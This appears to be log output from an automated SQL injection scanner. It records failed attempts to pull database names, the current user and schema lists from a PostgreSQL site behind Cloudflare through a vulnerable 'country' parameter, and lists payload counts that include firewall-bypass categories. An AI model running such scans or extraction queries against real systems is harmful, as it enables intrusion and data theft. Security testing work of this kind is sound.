+[!] [_extract_str] No oracle available for SQL: 'SELECT current_database()' (ConditionalErrorOracle not calibrated and MSE not wired). Extraction will return empty string.  Check that oracle calibration ran successfully.
+[!] [Extract] No boolean oracle available for 'SELECT current_database()...'
+    → extraction impossible without a working oracle.
+    → Ensure ConditionalErrorOracle calibrated successfully.
+[!] [_extract_str] mse_boolean oracle failed sanity (1=1→False, 1=2→False); discarding
+[!] [_extract_str] No oracle available for SQL: 'SELECT current_user' (ConditionalErrorOracle not calibrated and MSE not wired). Extraction will return empty string.  Check that oracle calibration ran successfully.
+[!] [Extract] No boolean oracle available for 'SELECT current_user...'
+    → extraction impossible without a working oracle.
+    → Ensure ConditionalErrorOracle calibrated successfully.
+[!] [_extract_str] mse_boolean oracle failed sanity (1=1→False, 1=2→False); discarding
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(datname,',') FROM pg_database WHERE datist" (ConditionalErrorOracle not calibrated and MSE not wired). Extraction will return empty string.  Check that oracle calibration ran successfully.
+[!] [Extract] No boolean oracle available for 'SELECT string_agg(datname,',') FROM pg_d...'
+    → extraction impossible without a working oracle.
+    → Ensure ConditionalErrorOracle calibrated successfully.
+[!] [_extract_str] mse_boolean oracle failed sanity (1=1→False, 1=2→False); discarding
+[!] [_extract_str] No oracle available for SQL: "SELECT string_agg(nspname, ',' ORDER BY nspname) FROM pg_cat" (ConditionalErrorOracle not calibrated and MSE not wired). Extraction will return empty string.  Check that oracle calibration ran successfully.
+[!] [Extract] No boolean oracle available for 'SELECT string_agg(nspname, ',' ORDER BY ...'
+    → extraction impossible without a working oracle.
+    → Ensure ConditionalErrorOracle calibrated successfully.
+[!] [_extract_str] mse_boolean oracle failed sanity (1=1→False, 1=2→False); discarding
+[!] [_extract_str] No oracle available for SQL: "SELECT array_to_string(array_agg(nspname ORDER BY nspname),'" (ConditionalErrorOracle not calibrated and MSE not wired). Extraction will return empty string.  Check that oracle calibration ran successfully.
+[!] [Extract] No boolean oracle available for 'SELECT array_to_string(array_agg(nspname...'
+    → extraction impossible without a working oracle.
+    → Ensure ConditionalErrorOracle calibrated successfully.
+[!] [Cleanup] Extraction timed out after 600s — cancelling
+[*] Extraction completed for 'country'
+[+] 
+
+[+] Scan complete   1538.57s
+[+] Requests sent   1294
+[+] DBMS            PostgreSQL
+[+] WAF             Cloudflare
+[+] Vulnerabilities 1 (country)
+[+] 
+[+] Report: 1 findings, 1 unique root causes
+[+] Report  output/sqlreaper_aad9d8bf004eaaae_1784915689.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
+[+] Markdown report  output/sqlreaper_aad9d8bf004eaaae.md
+[+] v19 post-processing complete  1 finding(s), params_scanned1, bandit: {'E': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}, 'B': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}, 'U': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}, 'T': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}, 'S': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}, 'O': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}}, calibrator_pairs: 1, trigram_vocab: 7752
+[+] [PayloadStats] {'total_payloads': 16161, 'by_dbms': {'MySQL': 3202, 'PostgreSQL': 2921, 'Oracle': 2274, 'MSSQL': 2097, 'SQLite': 2465, 'MariaDB': 3202}, 'by_technique': {'B': 1800, 'E': 2222, 'T': 1258, 'S': 1291, 'U': 1650, 'ST': 1793, 'WB': 1800, 'NV': 1514, 'EX': 1280, 'HY': 1553}, 'by_category': {'Boolean': 1800, 'Error': 2222, 'Timebased': 1258, 'Stacked': 1291, 'Union': 1650, 'Standard': 1793, 'WAFBypass': 1800, 'Novel': 1514, 'Exotic': 1280, 'Hybrid': 1553}}
